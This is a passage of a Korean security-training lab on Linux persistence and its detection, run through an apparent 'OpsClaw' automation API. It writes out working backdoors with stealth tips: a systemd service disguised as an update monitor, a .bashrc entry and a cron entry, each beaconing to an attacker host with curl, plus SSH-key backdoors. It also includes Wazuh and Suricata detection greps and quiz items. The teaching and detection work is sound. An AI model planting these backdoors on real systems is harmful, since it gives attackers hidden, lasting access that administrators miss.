> **배우는 것**: systemd 유닛 파일 구조, 서비스 자동 시작 설정, 정상 서비스로 위장하는 기법, systemd 기반 백도어의 탐지 방법을 이해한다.
>
> **결과 해석**: 서비스 유닛 파일이 정상 생성되면 1단계 성공이다. `systemctl enable` 후에는 재부팅 시 자동으로 실행된다. `Description`과 `ExecStart` 경로를 정상 서비스처럼 위장하면 탐지 난이도가 크게 올라간다.
>
> **실전 활용**: APT 그룹은 systemd 서비스를 "system-update-helper", "network-health-check" 등 정상 서비스와 유사한 이름으로 등록하여 관리자의 눈을 피한다.

```bash
# Systemd 서비스 persistence 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[T1543.002] Systemd Persistence 시뮬레이션\" && cat > /tmp/sim-update-helper.service << '\''SVCEOF'\''\n[Unit]\nDescription=System Update Health Monitor\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c '\''while true; do sleep 300; curl -s http://10.20.30.201:8080/health-check?id=$(hostname -s) > /dev/null 2>&1; done'\''\nRestart=on-failure\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nSVCEOF\necho \"--- 악성 서비스 파일 내용 ---\" && cat /tmp/sim-update-helper.service && echo && echo \"[참고] 실제 설치 명령:\" && echo \"  cp /tmp/sim-update-helper.service /etc/systemd/system/\" && echo \"  systemctl daemon-reload\" && echo \"  systemctl enable --now sim-update-helper.service\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DETECT] Systemd 서비스 감사\" && echo \"=== 최근 생성/수정된 서비스 파일 ===\"  && find /etc/systemd/system/ -name '*.service' -mtime -7 -ls 2>/dev/null && echo && echo \"=== 사용자 정의 서비스 (vendor 제외) ===\" && diff <(ls /lib/systemd/system/*.service 2>/dev/null | xargs -I{} basename {}) <(ls /etc/systemd/system/*.service 2>/dev/null | xargs -I{} basename {}) 2>/dev/null | grep '>' | head -10 && echo && echo \"=== 의심스러운 ExecStart (curl/wget/nc 포함) ===\" && grep -r 'ExecStart.*\\(curl\\|wget\\|nc\\|ncat\\|python\\)' /etc/systemd/system/ 2>/dev/null | head -10 || echo \"(발견 없음)\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `After=network-online.target`: 네트워크가 완전히 활성화된 후 서비스가 시작되도록 설정한다. C2 통신에 네트워크가 필요하므로 중요하다.
> - `Restart=on-failure`: 프로세스가 비정상 종료되면 자동으로 재시작한다. 방어자가 프로세스를 kill해도 다시 살아난다.
> - `RestartSec=60`: 재시작 간격을 60초로 설정하여 과도한 재시작 로그를 방지한다.
> - `diff <(ls ...) <(ls ...)`: 벤더 기본 서비스와 사용자 추가 서비스를 비교하여 비정상 서비스를 식별한다.
>
> **트러블슈팅**: `/etc/systemd/system/` 디렉토리에 쓰기 권한이 없으면 root 권한이 필요하다. 실습에서는 `/tmp/`에만 파일을 생성하고 실제 설치는 하지 않는다.

## 실습 3.3: SSH Authorized Keys 지속성

> **실습 목적**: SSH 공개키를 대상 시스템에 추가하여 비밀번호 없이 언제든 접속할 수 있는 백도어를 설치한다. T1098.004(SSH Authorized Keys)의 구현이다.
>
> **배우는 것**: SSH 키 기반 인증의 원리, authorized_keys 파일 구조, 키 기반 백도어의 은닉 기법(from= 제한, command= 강제)과 탐지 방법을 이해한다.
>
> **결과 해석**: 공격자의 공개키가 대상의 `~/.ssh/authorized_keys`에 추가되면 성공이다. 이후 공격자는 비밀번호 없이 SSH 접속이 가능하다. `from=` 옵션으로 특정 IP에서만 접속을 허용하면 탐지가 더 어렵다.
>
> **실전 활용**: SSH 키 백도어는 가장 안정적인 Persistence 기법 중 하나이다. 일반 관리자 키와 구분이 어렵고, 로그인 시 비밀번호 기록이 남지 않는다.

```bash
# SSH Key Persistence 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[T1098.004] SSH Key Persistence 시뮬레이션\" && echo \"=== 공격자 키 생성 (시뮬레이션) ===\" && ssh-keygen -t ed25519 -f /tmp/sim_attacker_key -N \"\" -C \"sim-backdoor-key\" -q 2>/dev/null && echo \"공개키:\" && cat /tmp/sim_attacker_key.pub && echo && echo \"=== 현재 authorized_keys 확인 ===\" && cat ~/.ssh/authorized_keys 2>/dev/null | wc -l && echo \"개의 키가 등록됨\" && echo && echo \"[참고] 실제 설치: echo '\\''<공개키>'\\'\\'' >> ~/.ssh/authorized_keys\" && echo \"[참고] 은닉: from=\\\"10.20.30.201\\\" 접두사로 IP 제한\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[DETECT] SSH 키 감사\" && echo \"=== 모든 사용자의 authorized_keys ===\" && for home in /home/* /root; do keyfile=\"$home/.ssh/authorized_keys\"; if [ -f \"$keyfile\" ]; then echo \"--- $keyfile ---\"; wc -l < \"$keyfile\"; echo \"개 키\"; cat \"$keyfile\" | awk '\\''{ print NR\": \"substr($0, length($0)-50) }'\\'' 2>/dev/null; fi; done && echo && echo \"=== 최근 수정된 SSH 파일 ===\" && find /home -path '*/.ssh/*' -mtime -7 -ls 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `ssh-keygen -t ed25519`: Ed25519 알고리즘으로 키를 생성한다. RSA보다 짧고 안전하여 현대적 환경에서 선호된다
> - `-N ""`: 빈 패스프레이즈를 설정한다. 자동화된 백도어에는 패스프레이즈가 없어야 한다
> - `-C "sim-backdoor-key"`: 키의 주석(comment) 필드로, 실전에서는 정상 사용자명으로 위장한다
> - `from="10.20.30.201"`: authorized_keys 옵션으로, 지정된 IP에서만 이 키로 접속을 허용한다
>
> **트러블슈팅**: `.ssh` 디렉토리가 없으면 `mkdir -p ~/.ssh && chmod 700 ~/.ssh`로 생성한다. 퍼미션이 잘못되면 SSH 데몬이 키 인증을 거부한다(`chmod 600 ~/.ssh/authorized_keys`).

## 실습 3.4: .bashrc를 이용한 로그인 트리거 지속성

> **실습 목적**: 사용자 로그인 시 자동 실행되는 셸 초기화 파일을 수정하여 백도어를 설치한다. T1546.004(Unix Shell Configuration Modification)의 구현이다.
>
> **배우는 것**: Bash 셸 초기화 파일 로드 순서(.bash_profile → .bashrc → .bash_logout), 로그인 셸과 비로그인 셸의 차이, 셸 설정 파일 변조 탐지 방법을 이해한다.
>
> **결과 해석**: .bashrc에 백도어 코드가 추가되면, 사용자가 SSH 로그인하거나 터미널을 열 때마다 공격자 코드가 실행된다. 정상 설정과 구분하기 어려운 위치에 삽입하면 탐지 난이도가 올라간다.
>
> **실전 활용**: .bashrc 백도어는 단순하지만 관리자가 간과하기 쉽다. 특히 환경변수 설정이나 alias 사이에 숨기면 육안 점검으로 발견하기 어렵다.

```bash
# .bashrc Persistence 시뮬레이션
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "echo \"[T1546.004] .bashrc Persistence 시뮬레이션\" && echo \"=== 현재 .bashrc 마지막 10줄 ===\" && tail -10 ~/.bashrc 2>/dev/null && echo && echo \"=== 공격자가 추가할 코드 (시뮬레이션) ===\" && cat << '\''RCEOF'\''\n# System performance monitoring (정상 주석으로 위장)\nexport PATH=$PATH  # 무해해 보이는 코드 사이에 삽입\n(nohup bash -c '\''while true; do sleep 3600; curl -s http://10.20.30.201:8080/beacon > /dev/null 2>&1; done'\'' &) 2>/dev/null\nRCEOF\necho && echo \"[참고] 실제 삽입: echo '<위 코드>' >> ~/.bashrc\" && echo \"[참고] 탐지: diff ~/.bashrc ~/.bashrc.bak 또는 FIM(Wazuh syscheck)\"",
    "subagent_url": "http://10.20.30.80:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `nohup ... &`: 백그라운드에서 실행하며 터미널 종료 후에도 프로세스가 유지된다
> - `2>/dev/null`: 에러 출력을 숨겨 사용자가 로그인 시 이상한 메시지를 보지 못하게 한다
> - `sleep 3600`: 1시간 간격으로 비콘을 전송하여 네트워크 모니터링에 잡히기 어렵게 한다
> - 정상 주석과 `export PATH` 사이에 삽입하여 육안 점검을 어렵게 하는 것이 은닉 기법이다
>
> **트러블슈팅**: `.bashrc`가 존재하지 않으면 `.profile` 또는 `.bash_profile`을 대상으로 한다. `ls -la ~/.*rc ~/.*profile`로 존재하는 초기화 파일을 확인한다.

---

# Part 4: Blue Team 탐지·방어 + OpsClaw 자동화 (40분)

## 4.1 단계별 탐지 매트릭스

각 공격 단계에서 발생하는 IOC(Indicator of Compromise)와 탐지 방법을 체계적으로 매핑한다.

### 공격-탐지 매핑 테이블

| 공격 단계 | 기법 | IOC 유형 | 탐지 도구 | 탐지 규칙/방법 |
|----------|------|---------|----------|--------------|
| Initial Access | T1190 SQLi | 웹 로그 이상 패턴 | WAF, Suricata | SQL 키워드 패턴 매칭 |
| Initial Access | T1566 Phishing | 의심 이메일 헤더 | 메일 게이트웨이 | SPF/DKIM/DMARC 검증 |
| Execution | T1059.004 Shell | 비정상 프로세스 생성 | Wazuh, auditd | bash 자식 프로세스 모니터링 |
| Execution | Reverse Shell | 이상 아웃바운드 연결 | Suricata, nftables | 비표준 포트 아웃바운드 탐지 |
| Persistence | T1053.003 Cron | crontab 변경 | Wazuh FIM | /var/spool/cron 변경 감시 |
| Persistence | T1543.002 Systemd | 서비스 파일 생성 | Wazuh FIM | /etc/systemd/system 변경 감시 |
| Persistence | T1098.004 SSH Key | authorized_keys 변경 | Wazuh FIM | ~/.ssh/ 디렉토리 감시 |
| Persistence | T1546.004 .bashrc | 셸 설정 파일 변경 | Wazuh FIM | ~/.*rc 파일 변경 감시 |

### Wazuh 탐지 규칙 매핑

| Wazuh Rule ID | 설명 | 대응 ATT&CK |
|---------------|------|------------|
| 510 | 파일 무결성 변경 감지 | T1053.003, T1543.002, T1098.004 |
| 5710 | SSH 인증 실패 | T1078, T1110 |
| 5712 | SSH 인증 성공 (새 IP) | T1078 |
| 31101 | 웹 공격 시도 (SQL Injection) | T1190 |
| 31103 | 웹 공격 시도 (XSS) | T1190 |
| 92000+ | 커스텀 규칙 | 조직 맞춤 |

## 실습 4.1: Wazuh FIM으로 Persistence 탐지

> **실습 목적**: Wazuh의 File Integrity Monitoring(FIM) 기능이 Persistence 설치 행위를 어떻게 탐지하는지 확인한다. 방어자 관점에서 공격 흔적을 추적한다.
>
> **배우는 것**: Wazuh FIM 설정 구조, syscheck 경보 분석, 파일 변경 이벤트의 상세 정보(변경 전후 해시, 시간, 사용자) 해석 방법을 이해한다.
>
> **결과 해석**: FIM 경보에 `changed`, `added` 이벤트가 나타나면 파일 변경이 탐지된 것이다. 변경된 파일 경로가 cron, systemd, SSH 관련이면 Persistence 시도로 판단한다.
>
> **실전 활용**: 실무 SOC에서 FIM 경보는 Persistence 탐지의 1차 방어선이다. 경보 빈도와 대상 파일 경로를 기준으로 우선순위를 결정한다.

```bash
# Wazuh FIM 설정 확인 및 persistence 관련 경보 조회
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[WAZUH FIM] syscheck 설정 확인\" && grep -A 20 '<syscheck>' /var/ossec/etc/ossec.conf 2>/dev/null | head -30 || echo \"Wazuh 설정 파일 접근 불가\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.100:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[WAZUH] Persistence 관련 경보 검색\" && sudo cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | grep -E \"crontab|systemd|authorized_keys|bashrc\" | tail -10 | python3 -m json.tool 2>/dev/null || echo \"관련 경보 없음 또는 접근 불가\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.100:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[SURICATA] 리버스 셸 탐지 시그니처 확인\" && sudo grep -r 'reverse.shell\\|shellcode\\|ATTACK.*shell' /etc/suricata/rules/ 2>/dev/null | head -10 || echo \"Suricata 규칙 접근 불가\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.1:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - `<syscheck>` 블록: Wazuh FIM의 감시 대상 디렉토리와 주기를 정의하는 설정이다
> - `alerts.json`: Wazuh가 생성한 모든 보안 경보가 JSON 형태로 저장되는 파일이다
> - `grep -E "crontab|systemd|authorized_keys"`: Persistence 관련 키워드로 경보를 필터링한다
>
> **트러블슈팅**: `/var/ossec/` 경로는 Wazuh 기본 설치 경로이다. 접근 권한이 없으면 `sudo` 없이는 읽을 수 없다. SubAgent가 sudo 권한이 있는지 확인한다.

## 실습 4.2: OpsClaw 자동화 — 전체 침투 체인 시뮬레이션

> **실습 목적**: Initial Access → Execution → Persistence의 3단계를 하나의 OpsClaw execute-plan으로 자동화하여, 실전 공격 체인을 재현한다.
>
> **배우는 것**: 다단계 공격의 의존성 관리, OpsClaw 태스크 체이닝, 공격 결과의 자동 수집 및 PoW 기록을 이해한다.
>
> **결과 해석**: 6개 태스크가 모두 exit_code 0으로 완료되면 전체 침투 체인이 성공한 것이다. PoW 블록에 각 단계의 실행 증거가 기록되어 감사 추적이 가능하다.
>
> **실전 활용**: 자동화된 공격 시뮬레이션은 Purple Team 훈련의 핵심이다. 공격 재현성을 보장하고, 방어 체계의 반복 테스트를 가능하게 한다.

```bash
# 전체 침투 체인 자동화 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"[PHASE 1: RECON] 대상 서비스 정찰\" && nmap -sV -p 22,80,443,3000,8080 10.20.30.80 2>/dev/null | grep -E \"open|filtered\" && echo \"[OK] 공격 표면 매핑 완료\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"[PHASE 2: INITIAL ACCESS] 웹 서비스 접근\" && curl -s -w \"\\nHTTP_CODE: %{http_code}\" http://10.20.30.80:3000/ 2>/dev/null | tail -3 && echo \"[OK] 초기 접근 확인\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"[PHASE 3: EXECUTION] 대상에서 명령 실행\" && whoami && id && echo \"[OK] 코드 실행 권한 확인\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 4,
        "instruction_prompt": "echo \"[PHASE 4: PERSISTENCE-1] Cron 백도어 확인\" && echo '*/5 * * * * curl -s http://10.20.30.201:8080/b > /dev/null 2>&1' > /tmp/sim_persistence_cron.txt && echo \"Cron 페이로드 준비 완료\" && cat /tmp/sim_persistence_cron.txt",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 5,
        "instruction_prompt": "echo \"[PHASE 5: PERSISTENCE-2] SSH 키 백도어 확인\" && ssh-keygen -t ed25519 -f /tmp/sim_backdoor_ed25519 -N '' -q 2>/dev/null && echo \"SSH 키 생성 완료\" && cat /tmp/sim_backdoor_ed25519.pub",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.80:8002"
      },
      {
        "order": 6,
        "instruction_prompt": "echo \"[PHASE 6: CLEANUP] 시뮬레이션 파일 정리\" && rm -f /tmp/sim_persistence_cron.txt /tmp/sim_backdoor_ed25519 /tmp/sim_backdoor_ed25519.pub /tmp/sim_invoice.hta /tmp/sim_cron_backdoor.txt /tmp/sim-update-helper.service 2>/dev/null && echo \"[OK] 정리 완료\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.80:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - 6개 태스크가 order 순서대로 순차 실행된다. 실전에서는 각 단계의 결과가 다음 단계의 입력이 된다
> - Phase 6(Cleanup)은 시뮬레이션 파일을 삭제하여 실습 환경을 원래 상태로 복원한다
> - `rm -f`는 파일이 없어도 에러를 반환하지 않는다
>
> **트러블슈팅**: 중간 태스크가 실패하면 `evidence/summary`에서 해당 태스크의 stderr을 확인한다. 네트워크 연결 문제는 `ping 10.20.30.80`으로 기본 연결성을 점검한다.

## 4.3 PoW 증거 확인 및 완료 보고서

```bash
# 실행 결과 요약 확인
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool
# 모든 태스크의 실행 결과가 evidence로 기록되어 있다
```

```bash
# PoW 블록 확인 — 침투 시뮬레이션의 암호학적 증거
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  "http://localhost:8000/pow/blocks?project_id=$PROJECT_ID" \
  | python3 -m json.tool
# 각 태스크마다 PoW 블록이 생성되어 실행의 무결성이 보장된다
```

```bash
# 완료 보고서 작성
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/completion-report \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "summary": "다단계 침투 시뮬레이션(Initial Access → Execution → Persistence) 완료",
    "outcome": "success",
    "work_details": [
      "피싱 시뮬레이션: HTA 페이로드 + 피싱 메일 템플릿 생성",
      "웹 익스플로잇: SQL Injection, 디렉토리 트래버설 시도",
      "리버스 셸: Bash/Python/Netcat/Perl 4가지 기법 확인",
      "Persistence: Cron, Systemd, SSH Key, .bashrc 4가지 기법 시뮬레이션",
      "Blue Team: Wazuh FIM 탐지 확인, Suricata 시그니처 검토",
      "전체 침투 체인 자동화 execute-plan 실행 및 PoW 검증"
    ]
  }' | python3 -m json.tool
# 프로젝트가 closed 상태로 전환된다
```

## 4.4 공격-방어 대응 매트릭스

```
이번 실습의 공격-방어 매핑:

공격 단계           | 공격 기법              | 방어 수단           | 담당 서버
===================╪=======================╪===================╪=========
Initial Access     | SQL Injection (T1190) | WAF 패턴 매칭       | web
                   | Phishing (T1566)      | 메일 필터링, 교육    | -
Execution          | Reverse Shell         | Suricata 탐지       | secu
                   | Python Payload        | 프로세스 모니터링    | siem
Persistence        | Cron (T1053.003)      | FIM (cron 디렉토리) | siem
                   | Systemd (T1543.002)   | FIM (systemd)      | siem
                   | SSH Key (T1098.004)   | FIM (authorized_keys)| siem
                   | .bashrc (T1546.004)   | FIM (홈 디렉토리)   | siem
```

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] T1190(웹 취약점 익스플로잇)과 T1566(피싱)의 차이를 설명할 수 있는가?
- [ ] SQL Injection의 원리와 방어 방법(파라미터화 쿼리, WAF)을 설명할 수 있는가?
- [ ] 리버스 셸과 바인드 셸의 차이점과 각각의 방화벽 통과 조건을 설명할 수 있는가?
- [ ] Bash, Python, Netcat 중 2가지 이상의 리버스 셸 페이로드를 작성할 수 있는가?
- [ ] 파일리스 공격(Fileless Attack)의 원리와 탐지 어려움을 설명할 수 있는가?
- [ ] Cron, Systemd, SSH Key, .bashrc 4가지 Persistence 기법을 설치하고 탐지할 수 있는가?
- [ ] 각 Persistence 기법의 ATT&CK ID를 정확히 매핑할 수 있는가?
- [ ] Wazuh FIM이 파일 변경을 탐지하는 원리를 설명할 수 있는가?
- [ ] OpsClaw execute-plan으로 다단계 공격을 자동화할 수 있는가?
- [ ] 완료 보고서에 각 단계의 결과와 PoW 증거를 포함할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** SQL Injection에서 `' OR 1=1--`의 `--`의 역할은?
- (a) 문자열 연결  (b) **SQL 주석으로 나머지 쿼리를 무효화**  (c) OR 연산 강화  (d) 에러 무시

**Q2.** 리버스 셸이 바인드 셸보다 실전에서 선호되는 주된 이유는?
- (a) 속도가 빠르다  (b) **대부분의 방화벽이 아웃바운드를 허용한다**  (c) 암호화가 된다  (d) 루트 권한이 불필요하다

**Q3.** T1053.003(Cron) Persistence를 탐지하기 위해 감시해야 할 디렉토리가 아닌 것은?
- (a) /var/spool/cron/  (b) /etc/cron.d/  (c) /etc/crontab  (d) **/var/log/cron/**

**Q4.** Systemd 서비스 기반 백도어에서 `Restart=on-failure`가 공격자에게 유리한 이유는?
- (a) 서비스 속도 향상  (b) **방어자가 kill해도 자동 재시작**  (c) 로그 삭제  (d) 네트워크 우회

**Q5.** SSH Authorized Keys 백도어에서 `from="10.20.30.201"` 옵션의 효과는?
- (a) 키 암호화  (b) **지정 IP에서만 해당 키로 접속 허용**  (c) 접속 로그 삭제  (d) 비밀번호 면제

**Q6.** 파일리스(Fileless) 공격이 전통적 AV를 우회하는 원리는?
- (a) 파일 암호화  (b) 패킹  (c) **디스크에 파일을 쓰지 않아 스캔 대상이 없음**  (d) 서명 도용

**Q7.** .bashrc 백도어가 실행되는 시점은?
- (a) 시스템 부팅 시  (b) 크론 주기마다  (c) **사용자 셸 세션 시작 시**  (d) 네트워크 연결 시

**Q8.** Wazuh FIM(syscheck)이 파일 변경을 탐지하는 기본 방법은?
- (a) 실시간 프로세스 감시  (b) **파일 해시값 비교 (주기적 스캔)**  (c) 네트워크 트래픽 분석  (d) 메모리 스캔

**Q9.** OpsClaw execute-plan에서 risk_level="critical"인 태스크의 기본 동작은?
- (a) 즉시 실행  (b) 경고만 출력  (c) **dry_run 강제, 사용자 확인 후 실행**  (d) 거부

**Q10.** 다음 중 T1098.004(SSH Authorized Keys)의 방어 방법으로 가장 효과적인 것은?
- (a) 비밀번호 복잡성 강화  (b) **authorized_keys 파일 FIM 모니터링 + 주기적 키 감사**  (c) SSH 포트 변경  (d) 방화벽 인바운드 차단

**정답:** Q1:b, Q2:b, Q3:d, Q4:b, Q5:b, Q6:c, Q7:c, Q8:b, Q9:c, Q10:b

---

## 과제

### 과제 1: Persistence 기법 비교 분석 (필수)
이번 실습에서 다룬 4가지 Persistence 기법(Cron, Systemd, SSH Key, .bashrc)에 대해:
- 각 기법의 장점/단점을 표로 정리하라
- 공격자 관점에서 가장 효과적인 기법과 그 이유를 논하라
- 방어자 관점에서 각 기법의 탐지 우선순위를 결정하고 근거를 제시하라

### 과제 2: 리버스 셸 탐지 규칙 작성 (필수)
Suricata 또는 Wazuh에서 리버스 셸 연결을 탐지하는 커스텀 규칙을 작성하라:
- Suricata 시그니처 규칙 최소 2개 (서로 다른 탐지 기준)
- 각 규칙의 탐지 원리와 오탐(False Positive) 가능성을 분석하라
- 공격자가 이 규칙을 우회할 수 있는 방법을 1가지 이상 제시하라

### 과제 3: 자동화 침투 시나리오 확장 (선택)
OpsClaw execute-plan을 사용하여 다음을 포함하는 확장 시나리오를 설계하라:
- 최소 8개 태스크로 구성된 다단계 공격 체인
- 각 태스크에 적절한 risk_level 지정
- LD_PRELOAD(T1574.006) 또는 Web Shell(T1505.003) 기법을 1개 이상 포함
- 공격과 동시에 방어 측 탐지 확인 태스크를 병렬로 구성

---

## 다음 주 예고

**Week 03: C2 채널 구축 — DNS Tunneling, HTTP C2, 암호화 통신**

이번 주에 확보한 초기 접근과 지속성을 기반으로, 다음 주에는 공격자가 침투한 시스템을 안정적으로 원격 제어하기 위한 C2(Command and Control) 채널 구축 기법을 학습한다. DNS 터널링(dnscat2), HTTP 기반 C2, 암호화 채널의 구현과 탐지를 다룬다.
